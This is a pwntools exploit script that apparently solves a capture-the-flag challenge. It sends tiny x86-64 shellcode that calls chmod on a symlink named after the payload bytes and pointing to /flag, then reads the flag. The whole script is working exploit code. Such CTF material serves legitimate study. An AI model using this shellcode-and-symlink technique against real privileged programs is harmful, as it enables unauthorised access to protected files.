#!/usr/bin/env python3
from pwn import *
import os

context.update(arch="amd64", os="linux")
context.log_level = "debug"

target_binary = "/challenge/pocket-payload"

payload_asm = """
.intel_syntax noprefix
    push rdx
    pop rdi
    push 0x3f
    pop rsi
    mov al, 90
    syscall
"""

payload = asm(payload_asm).ljust(12, b"\x90")

log.info(f"Payload (also our symlink name): {payload}")

try:
    os.remove(payload)
except OSError:
    pass

os.symlink(b"/flag", payload)

p = process(target_binary)
p.send(payload)

p.wait()

os.system("cat /flag")
